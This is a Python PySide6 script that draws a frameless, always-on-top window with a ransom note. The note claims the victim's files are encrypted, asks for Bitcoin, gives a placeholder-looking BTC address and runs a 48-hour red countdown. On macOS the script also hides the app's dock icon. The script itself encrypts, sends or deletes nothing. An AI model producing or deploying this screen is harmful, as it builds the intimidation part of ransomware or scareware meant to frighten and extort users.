import sys
from PySide6.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout
from PySide6.QtCore import Qt, QTimer

total_seconds = 48 * 60 * 60
def run_gui():
    app = QApplication(sys.argv)

    if sys.platform == "darwin":
        try:
            from AppKit import NSApp, NSApplicationActivationPolicyAccessory
            NSApp.setActivationPolicy_(NSApplicationActivationPolicyAccessory)
        except Exception as e:
            return e

    window = QWidget()
    window.setWindowFlag(Qt.WindowStaysOnTopHint)
    window.setWindowFlag(Qt.FramelessWindowHint)
    window.setWindowTitle("secret")

    # --------------------------------
    # Layout
    # --------------------------------

    layout = QVBoxLayout()
    layout.setAlignment(Qt.AlignCenter)



    time_layout = QHBoxLayout()
    time_layout.setAlignment(Qt.AlignCenter)

    label_main = QLabel()
    label_sec = QLabel()

    label_main.setStyleSheet("""
    font-size: 80px;
    color: red;
    font-weight: bold;
    """)

    label_sec.setStyleSheet("""
    font-size: 40px;
    color: red;
    """)



    label_main.setAlignment(Qt.AlignBottom)
    label_sec.setAlignment(Qt.AlignBottom)

    time_layout.addWidget(label_main)
    time_layout.addWidget(label_sec)



    # --------------------------------
    #  Text
    # --------------------------------

    label_text = QLabel("You’ve been HACKED! ⚠️ <br> <span style=""color:green;font-size:40px;>Your files are encrypted! To get the key send me </span> <span style=""color:orange;font-size:40px;>₿itcoin!</span>‼️")
    label_text = QLabel("⚠️ You’ve been HACKED! ⚠️ <br><br>‼️ Your files are encrypted! To get the key send me <span style=color:orange;>₿</span>itcoin! ‼️ <br><br> <span style=""color:red;font-size:40px;><span style=color:orange;font-size:40px>₿</span>TC-ADDRESS:</span> <br> " \
    "<span style=""font-size:20px;text-decoration:underline;>G77Vg7t5283939siuwjjw9ue88e8sus88wu2j9</span>") 

    label_text.setAlignment(Qt.AlignCenter)
    label_text.setStyleSheet("""
    font-size: 24px;
    color: white;
    """)

    layout.addLayout(time_layout)
    layout.addWidget(label_text)

    window.setLayout(layout)

    # --------------------------------
    # Timer
    # --------------------------------

    def update_timer():
        global total_seconds

        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        seconds = total_seconds % 60

        label_main.setText(f"{hours:02}:{minutes:02}")
        label_sec.setText(f":{seconds:02}")

        if total_seconds > 0:
            total_seconds -= 1


    timer = QTimer()
    timer.timeout.connect(update_timer)
    timer.start(1000)

    update_timer()

    window.resize(400, 200)
    window.show()

    sys.exit(app.exec())